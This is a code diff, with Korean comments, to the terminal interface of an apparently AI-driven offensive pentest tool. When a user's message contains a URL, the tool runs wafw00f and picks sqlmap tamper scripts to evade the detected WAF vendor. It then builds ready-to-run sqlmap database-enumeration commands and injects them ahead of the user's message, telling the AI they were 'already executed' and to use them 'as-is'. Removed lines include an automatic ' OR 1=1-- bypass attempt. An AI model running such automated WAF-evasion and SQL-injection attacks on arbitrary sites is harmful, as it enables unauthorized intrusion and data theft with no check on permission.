@@ -25,7 +25,7 @@ from prompt_toolkit.formatted_text import HTML
 from prompt_toolkit.completion import Completer, Completion, WordCompleter
 
 from ..models.base import Message, StreamChunk
-from ..lang.strings import get_strings, SUPPORTED_LANGS
+from ..lang.strings import get_strings, get_slash_commands, SUPPORTED_LANGS
 
 # ── 색상 팔레트 (해커 그린 테마) ──────────────────────────────────
 THEME = {
@@ -58,33 +58,20 @@ PT_STYLE = PTStyle.from_dict({
 })
 
 
-SLASH_COMMANDS = [
-    ("/help",    "도움말 표시"),
-    ("/clear",   "화면 초기화"),
-    ("/model",   "AI 모델 변경"),
-    ("/config",  "설정 보기"),
-    ("/history", "대화 기록 보기"),
-    ("/export",  "대화 기록 파일로 저장"),
-    ("/lang",    "언어 변경"),
-    ("/scan",    "빠른 레드팀 스캔  /scan <url>"),
-    ("/waf",     "WAF 탐지 + 자동 우회  /waf <url>"),
-    ("/crack",   "해시 크랙  /crack [hash]  (인자 없으면 자동 추출)"),
-    ("/tools",   "도구 목록 + 자동 설치  /tools [install <name>|all]"),
-    ("/skill",   "스킬 검색  /skill <keyword>"),
-    ("/stop",    "자동 크랙 중단"),
-    ("/quit",    "종료"),
-]
-
-
 class _SlashCompleter(Completer):
-    """/ 입력 시 슬래시 명령어 자동완성 (설명 포함)"""
+    """/ 입력 시 슬래시 명령어 자동완성 (현재 언어 기준 설명)"""
+
+    def __init__(self, lang_getter):
+        # lang_getter: 현재 언어 코드를 반환하는 callable (lambda: self.config.lang)
+        self._lang_getter = lang_getter
 
     def get_completions(self, document, complete_event):
         text = document.text_before_cursor
         if not text.startswith("/"):
             return
         word = text.split()[0] if text.split() else "/"
-        for cmd, desc in SLASH_COMMANDS:
+        commands = get_slash_commands(self._lang_getter())
+        for cmd, desc in commands:
             if cmd.startswith(word) or word == "/":
                 yield Completion(
                     cmd,
@@ -246,8 +233,10 @@ class BingoTerminal:
 
     def _auto_waf_scan(self, text: str) -> str:
         """
-        메시지에서 URL을 감지하면 즉시 WAF 스캔 + 자동 우회 시도.
-        결과를 AI 컨텍스트 문자열로 반환 — AI가 실제 스캔 결과 기반으로 응답.
+        메시지에서 URL을 감지하면:
+          1) 실제 wafw00f 바이너리 실행 (가장 정확)
+          2) 실패 시 내부 Python WafDetector 폴백
+          3) WAF 탐지 결과 + sqlmap 명령을 AI 컨텍스트로 반환
         """
         import re
         urls = re.findall(r"https?://[^\s\"'<>]+", text)
@@ -256,85 +245,135 @@ class BingoTerminal:
 
         url = urls[0].rstrip("/?,")
         results = []
-        try:
-            from ..tools.http_probe import HttpProbe
-            from ..tools.waf_bypass import WafDetector, WafBypassEngine
 
+        self.console.print(
+            f"\n[{THEME['warn']}]🛡 WAF 자동 스캔: {url}[/]"
+        )
+
+        # ── Step 1: 실제 wafw00f 바이너리 실행 (가장 신뢰도 높음) ───
+        waf_type = None
+        waf_detected = False
+        raw_output = ""
+
+        try:
+            from ..tools.executor import ToolExecutor
+            executor = ToolExecutor(timeout=30)
+
+            with self.console.status(f"[{THEME['warn']}]wafw00f 실행 중...[/]"):
+                tool_result = executor.wafw00f(url)
+
+            raw_output = tool_result.stdout.strip()
+
+            if raw_output:
+                self.console.print(
+                    f"[{THEME['dim']}]{raw_output[:200]}[/]"
+                )
+
+            # wafw00f 출력 파싱
+            lower = raw_output.lower()
+            if "is behind" in lower or "is protected by" in lower:
+                waf_detected = True
+                # "The site X is behind Cloudflare (Cloudflare Inc.) WAF."
+                # "The site X is protected by Cloudflare WAF."
+                import re as _re
+                m = _re.search(
+                    r"is (?:behind|protected by)\s+(.+?)(?:\s+\(|\.?\s*WAF|$)",
+                    raw_output, _re.IGNORECASE
+                )
+                waf_type = m.group(1).strip() if m else "Unknown"
+            elif "no waf" in lower or "does not seem to be" in lower:
+                waf_detected = False
+            elif tool_result.used_fallback:
+                # 폴백 사용된 경우 내부 탐지기로 보완
+                raise RuntimeError("fallback — try internal detector")
+
+        except Exception:
+            # ── Step 2: 내부 Python WafDetector 폴백 ─────────────────
+            try:
+                from ..tools.http_probe import HttpProbe
+                from ..tools.waf_bypass import WafDetector
+
+                with self.console.status(f"[{THEME['warn']}]내부 WAF 탐지 중...[/]"):
+                    probe = HttpProbe(url, timeout=8)
+                    detector = WafDetector(probe)
+                    internal = detector.detect(url)
+
+                waf_detected = internal.detected
+                waf_type = internal.waf_type if internal.detected else None
+                raw_output = (
+                    f"Internal detector: waf_detected={internal.detected}, "
+                    f"waf_type={internal.waf_type}, confidence={internal.confidence}"
+                )
+                self.console.print(f"[{THEME['dim']}]{raw_output}[/]")
+            except Exception as e2:
+                results.append(f"WAF_SCAN_ERROR: {e2}")
+                return "\n".join(results)
+
+        # ── 결과 출력 + sqlmap 명령 생성 ──────────────────────────────
+        if waf_detected and waf_type:
             self.console.print(
-                f"\n[{THEME['warn']}]🛡 WAF 자동 스캔: {url}[/]", end=" "
+                f"[{THEME['error']}]🔥 WAF 탐지: {waf_type}[/]"
             )
 
-            probe = HttpProbe(url, timeout=8)
-            detector = WafDetector(probe)
+            # WAF 타입에 따른 tamper 선택
+            tamper_map = {
+                "cloudflare": "space2comment,between,charencode,randomcase",
+                "aws":        "space2mysqlblank,equaltolike,greatest",
+                "modsecurity": "space2comment,between,modsecurityversioned",
+                "wordfence":   "space2comment,between,charencode",
+                "sucuri":      "space2comment,randomcase,charencode",
+                "akamai":      "space2comment,between,charencode,randomcase",
+            }
+            key = waf_type.lower().split()[0] if waf_type else ""
+            tamper = next(
+                (v for k, v in tamper_map.items() if k in key),
+                "space2comment,between,charencode"  # default
+            )
 
-            with self.console.status(f"[{THEME['warn']}]탐지 중...[/]"):
-                waf_result = detector.detect(url)
+            sqlmap_cmd = (
+                f'sqlmap -u "{url}?id=1" '
+                f'--tamper={tamper} '
+                f'--delay=2 --random-agent --level=3 --risk=2 --batch --dbs'
+            )
 
-            if waf_result.detected:
-                self.console.print(
-                    f"[{THEME['error']}]WAF 탐지: {waf_result.waf_type}[/]"
-                )
-                # 자동 우회 시도
-                engine = WafBypassEngine(probe)
-                bypass_ok, attempt = engine.auto_bypass(
-                    url + "?id=1", "' OR 1=1--"
-                )
+            results.append(
+                f"WAF_SCAN_RESULT:\n"
+                f"  url={url}\n"
+                f"  waf_detected=True\n"
+                f"  waf_type={waf_type}\n"
+                f"  raw_output={raw_output[:300]}\n\n"
+                f"SQLMAP_COMMAND (WAF bypass already applied, use as-is):\n"
+                f"  {sqlmap_cmd}"
+            )
+            self.console.print(
+                f"[{THEME['dim']}]  → {sqlmap_cmd[:90]}...[/]"
+            )
+        else:
+            self.console.print(f"[{THEME['success']}]✓ WAF 없음 — 직접 공격 가능[/]")
+            results.append(
+                f"WAF_SCAN_RESULT:\n"
+                f"  url={url}\n"
+                f"  waf_detected=False\n"
+                f"  raw_output={raw_output[:200]}\n\n"
+                f"SQLMAP_COMMAND (no WAF — direct attack):\n"
+                f'  sqlmap -u "{url}?id=1" --batch --random-agent --level=3 --dbs'
+            )
 
-                # WAF 우회 결과 → sqlmap 인자로 변환
-                sqlmap_args = engine.to_sqlmap_args(waf_result, attempt if bypass_ok else None)
-                sqlmap_cmd = (
-                    f'sqlmap -u "{url}?PARAM=1" '
-                    f"{sqlmap_args} "
-                    f"--dbs --batch"
-                )
-
-                bypass_line = (
-                    f"bypass_success=True\n"
-                    f"bypass_technique={attempt.technique}\n"
-                    f"bypass_payload={attempt.payload_modified}"
-                    if bypass_ok and attempt
-                    else "bypass_success=False"
-                )
-                results.append(
-                    f"WAF_SCAN_RESULT:\n"
-                    f"  url={url}\n"
-                    f"  waf_detected=True\n"
-                    f"  waf_type={waf_result.waf_type}\n"
-                    f"  confidence={waf_result.confidence}\n"
-                    f"  {bypass_line}\n\n"
-                    f"SQLMAP_COMMAND (use this exact command — WAF bypass already applied):\n"
-                    f"  {sqlmap_cmd}"
-                )
-                if bypass_ok and attempt:
-                    self.console.print(
-                        f"[{THEME['success']}]✓ 우회 성공: {attempt.technique} → sqlmap 인자 자동 적용됨[/]"
-                    )
-                    self.console.print(
-                        f"[{THEME['dim']}]  {sqlmap_cmd[:80]}...[/]"
-                    )
-                else:
-                    self.console.print(
-                        f"[{THEME['warn']}]우회 기법 탐색 중 — AI가 추가 전략 적용[/]"
-                    )
-            else:
-                self.console.print(f"[{THEME['success']}]WAF 없음[/]")
-                results.append(
-                    f"WAF_SCAN_RESULT:\n"
-                    f"  url={url}\n"
-                    f"  waf_detected=False\n\n"
-                    f"SQLMAP_COMMAND (no WAF — direct attack):\n"
-                    f'  sqlmap -u "{url}?PARAM=1" --batch --random-agent --dbs'
-                )
-
-            # 빠른 핑거프린트
+        # ── 빠른 핑거프린트 (실패해도 무시) ──────────────────────────
+        try:
+            from ..tools.http_probe import HttpProbe
             with self.console.status(f"[{THEME['dim']}]핑거프린트...[/]"):
-                fp = probe.fingerprint()
-            if fp:
-                tech = ", ".join(fp.get("tech", [])) or "unknown"
-                results.append(f"[FINGERPRINT]\nurl={url}\ntech_stack={tech}\ncms={fp.get('cms','unknown')}\n[/FINGERPRINT]")
-
-        except Exception as e:
-            results.append(f"[WAF_SCAN_ERROR]\n{e}\n[/WAF_SCAN_ERROR]")
+                fp = HttpProbe(url, timeout=6).fingerprint()
+            tech = ", ".join(fp.get("tech", [])) or "unknown"
+            results.append(
+                f"FINGERPRINT:\n"
+                f"  url={url}\n"
+                f"  tech_stack={tech}\n"
+                f"  cms={fp.get('cms', 'unknown')}\n"
+                f"  server={fp.get('server', 'unknown')}"
+            )
+        except Exception:
+            pass
 
         return "\n\n".join(results)
 
@@ -358,10 +397,9 @@ class BingoTerminal:
         # 관련 스킬 자동 조회
         skill_context = self._get_skill_context(text)
 
-        # URL 감지 시 실제 WAF 스캔 실행 → 결과를 AI 컨텍스트에 주입
+        # URL 감지 시 실제 WAF 스캔 실행
+        # → 결과를 유저 메시지 앞에 직접 붙임 (AI가 "이미 실행됨"을 명확히 인식)
         waf_context = self._auto_waf_scan(text)
-        if waf_context:
-            skill_context = waf_context + ("\n\n" + skill_context if skill_context else "")
 
         # PentAGI식 XML 태스크 래핑 (보안 관련 요청만)
         _security_keywords = (
@@ -375,6 +413,16 @@ class BingoTerminal:
             wrapped_text = wrap_task(text)
         else:
             wrapped_text = text
+
+        # WAF 스캔 결과를 유저 메시지 앞에 직접 주입
+        # → AI가 시스템 프롬프트 끝 컨텍스트보다 훨씬 명확하게 인식함
+        if waf_context:
+            wrapped_text = (
+                "=== BINGO AUTO-SCAN RESULTS (already executed, do NOT ask to run again) ===\n"
+                + waf_context
+                + "\n=== END AUTO-SCAN ===\n\n"
+                + wrapped_text
+            )
 
         self.history.append(Message(role="user", content=wrapped_text))
         self._append_to_session_log("user", text)
@@ -529,19 +577,33 @@ class BingoTerminal:
 
     def _cmd_lang(self) -> None:
         self.console.print(f"\n[{THEME['primary']}]{self.s['select_lang']}[/]")
-        for i, (code, label) in enumerate(SUPPORTED_LANGS.items(), 1):
-            self.console.print(f"  [{THEME['secondary']}]{i}[/] — {label}")
-        choice = Prompt.ask(
-            f"[{THEME['primary']}]>[/]",
-            choices=list(SUPPORTED_LANGS.keys()) + ["1", "2", "3"],
+        lang_list = list(SUPPORTED_LANGS.keys())   # ["ko", "zh", "en"]
+        for i, (code, label) in enumerate(lang_list, 1):
+            self.console.print(f"  [{THEME['secondary']}]{i}[/] — {label}  [{THEME['dim']}]({code})[/]")
+        self.console.print()
+
+        # 번호(1/2/3) 또는 코드(ko/zh/en) 둘 다 허용
+        raw = Prompt.ask(
+            f"[{THEME['primary']}][ko/zh/en/1/2/3][/]",
+        ).strip().lower()
+
+        # 번호 입력 시 코드로 변환
+        num_map = {str(i + 1): code for i, code in enumerate(lang_list)}
+        lang = num_map.get(raw, raw)
+
+        if lang not in SUPPORTED_LANGS:
+            self._warn(f"지원하지 않는 언어: {raw}  (ko / zh / en 또는 1 / 2 / 3)")
+            return
+
+        self.config.lang = lang
+        self.config.save()
+        self.s = get_strings(lang)
+        self._success(self.s["lang_saved"])
+        # 배너 언어 즉시 반영
+        self.console.print(
+            f"  [{THEME['dim']}]언어 변경 완료: {SUPPORTED_LANGS[lang]}  "
+            f"— 모든 메시지가 즉시 적용됩니다[/]"
         )
-        mapping = {str(i+1): k for i, k in enumerate(SUPPORTED_LANGS)}
-        lang = mapping.get(choice, choice)
-        if lang in SUPPORTED_LANGS:
-            self.config.lang = lang
-            self.config.save()
-            self.s = get_strings(lang)
-            self._success(self.s["lang_saved"])
 
     def _cmd_model(self) -> None:
         from ..models.registry import BUILTIN_PROVIDERS
@@ -1056,7 +1118,7 @@ class BingoTerminal:
         self._session = PromptSession(
             history=FileHistory(str(hist_path)),
             auto_suggest=AutoSuggestFromHistory(),
-            completer=_SlashCompleter(),
+            completer=_SlashCompleter(lambda: self.config.lang),
             complete_while_typing=True,
             mouse_support=False,
         )
